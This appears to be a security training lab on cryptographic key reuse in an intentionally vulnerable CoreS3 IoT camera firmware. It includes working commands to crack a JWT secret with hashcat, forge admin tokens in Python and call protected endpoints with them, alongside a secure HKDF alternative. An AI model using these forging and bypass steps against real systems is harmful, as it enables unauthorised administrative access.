# L29: Cryptographic Key Reuse

## Goal
Demonstrate how reusing the JWT signing secret `"secret123"` across multiple services allows a single key compromise to cascade into full system takeover.

## Background

**Why this matters**: Reusing the same cryptographic key for multiple purposes (signing, encryption, authentication) means one compromise cascades to everything.

**What you're looking for in IoT devices:**
- Same key used for multiple purposes (encryption, authentication, signing)
- No key derivation function (KDF) or key hierarchy
- Hardcoded secrets visible in firmware strings

**On CoreS3**: The firmware uses `jwtSecret = "secret123"` for all JWT signing via `hmacSha256(signatureInput, jwtSecret)`. If you crack it in L10 (JWT cracking), the same key works for forging tokens for all services on the device.

**Vulnerable pattern:**
```cpp
// Same secret used everywhere
#define SHARED_SECRET "secret123"

String jwt = signJWT(payload, SHARED_SECRET);
String session = hmac(session_data, SHARED_SECRET);
bool valid = verifyHMAC(request, SHARED_SECRET);
String config = encrypt(sensitive_data, SHARED_SECRET);
```

**Secure alternative:** Derive unique keys per purpose using a KDF:
```cpp
uint8_t jwt_key[32], session_key[32], api_key[32];
hkdf(master_key, "jwt-signing", jwt_key);
hkdf(master_key, "session-tokens", session_key);
hkdf(master_key, "api-auth", api_key);
```

## Lab Walkthrough

### Step 1: Crack the JWT Secret (or Recall from L10)

Obtain the JWT signing secret by cracking a captured token. If you completed L10, you already know it is `"secret123"`.

```bash
# Get a JWT token by logging in
curl -s -X POST http://192.168.4.1/login \
  -d "username=user&password=CoreS3_User_2024"

# Expected output (text/plain):
# Login successful (user)
#
# Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlci
# IsInJvbGUiOiJ1c2VyIiwiZXhwIjo1MTgzODk2fQ.XXXXXXXXXXXXXXXXXXXX

# Save and crack with hashcat (mode 16500 = JWT)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." > token.txt
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt

# Expected result:
# eyJhbGciOi...:secret123
```

### Step 2: Confirm Key Reuse Across Endpoints

Verify the cracked secret works on multiple endpoints. If the same key signs tokens for different services, a single compromise cascades across the entire device.

```bash
# Forge a user-role token with the cracked secret
FORGED_USER=$(python3 -c "
import jwt
print(jwt.encode({'user':'attacker','role':'user','exp':9999999999}, 'secret123', algorithm='HS256'))
")

# Forge an admin-role token with the SAME secret
FORGED_ADMIN=$(python3 -c "
import jwt
print(jwt.encode({'user':'attacker','role':'admin','exp':9999999999}, 'secret123', algorithm='HS256'))
")

# Test both against different endpoints
curl -s "http://192.168.4.1/settings?token=$FORGED_USER" | head -3
curl -s "http://192.168.4.1/admin?token=$FORGED_ADMIN" | head -3
# Both should return 200 OK - same key protects everything
```

The single cracked secret gives access to all JWT-protected endpoints: `/admin`, `/admin-panel`, `/admin/status`, `/admin/nvs`, `/settings`, `/snapshot`.

### Step 3: Forge Tokens for All Services

Use the cracked secret to forge JWTs with arbitrary claims (e.g., admin role). Since the device verifies every token with the same `"secret123"`, any token you sign with that secret will be accepted.

```bash
python3 << 'EOF'
import jwt
import json

shared_secret = "secret123"

# Forge an admin JWT
admin_token = jwt.encode(
    {"role": "admin", "user": "attacker", "iat": 1700000000},
    shared_secret,
    algorithm="HS256"
)
print(f"Forged admin JWT:\n  {admin_token}\n")

# Forge a service-to-service token
service_token = jwt.encode(
    {"service": "config-manager", "permissions": ["read", "write", "admin"]},
    shared_secret,
    algorithm="HS256"
)
print(f"Forged service token:\n  {service_token}\n")

# Decode to verify structure
decoded = jwt.decode(admin_token, shared_secret, algorithms=["HS256"])
print(f"Decoded admin token:\n  {json.dumps(decoded, indent=2)}")
EOF

# Expected output:
# Forged admin JWT:
#   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJ1c2
#   VyIjoiYXR0YWNrZXIiLCJpYXQiOjE3MDAwMDAwMDB9.XXXXXXXXXXXXXXXXXXXX
#
# Forged service token:
#   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXJ2aWNlIjoiY29uZmlnLW
#   1hbmFnZXIiLCJwZXJtaXNzaW9ucyI6WyJyZWFkIiwid3JpdGUiLCJhZG1pbiJd
#   fQ.XXXXXXXXXXXXXXXXXXXX
#
# Decoded admin token:
#   {
#     "role": "admin",
#     "user": "attacker",
#     "iat": 1700000000
#   }
```

### Step 4: Access Protected Endpoints with Forged Credentials

Use the forged admin JWT to access protected endpoints, completing the attack chain: crack key in one context, bypass auth in all others.

```bash
# Generate and use a forged admin JWT
FORGED_TOKEN=$(python3 -c "
import jwt
print(jwt.encode({'role': 'admin', 'user': 'attacker'}, 'secret123', algorithm='HS256'))
")

# Access admin status with forged token
curl -s http://192.168.4.1/admin/status \
  -H "Authorization: Bearer ${FORGED_TOKEN}"

# Expected output:
# {"device_id":"...","version":"1.0.0","build":"debug",
#  "firmware":"1.0.0","ip_address":"192.168.4.1",
#  "camera_initialized":true,"admin_mode":true,
#  "uptime":...,"free_heap":...,"free_psram":...}

# Access other protected resources
curl -s http://192.168.4.1/config

# Expected output (plaintext, no auth required):
# Device Configuration
#
# User PIN: XXXXXX
# Admin PIN: YYYYYY
# WiFi SSID: CoreS3-CAM-XXXX
# Device ID: XXXXXXXXXXXX
# Debug Mode: OFF
```

**Serial console logs each forged request:**
```
[WEB] GET /admin/status
[AUTH] JWT verified for user: attacker role: admin
```

## Impact

- **Single point of failure**: `jwtSecret = "secret123"` is hardcoded once and used for all cryptographic operations
- **Cross-service cascade**: Cracking the key from one JWT (L10) immediately compromises JWT signing, session tokens, and API auth
- **No key derivation**: Raw secret used directly - no HKDF, PBKDF2, or purpose-specific keys
- **Forged admin access**: Attacker creates admin-level JWTs that pass verification on all protected endpoints
- **Multiple extraction paths**: The shared secret can also be found via firmware dump (L04), path traversal (L09), or unauth config (L15)

## References

- [CWE-323: Reusing a Nonce, Key Pair in Encryption](https://cwe.mitre.org/data/definitions/323.html)
- [CWE-321: Use of Hard-coded Cryptographic Key](https://cwe.mitre.org/data/definitions/321.html)
- [OWASP Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
- [OWASP Key Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html)
- [NIST SP 800-57: Key Management Guidelines](https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final)
- [RFC 5869: HKDF - HMAC-based Key Derivation Function](https://datatracker.ietf.org/doc/html/rfc5869)
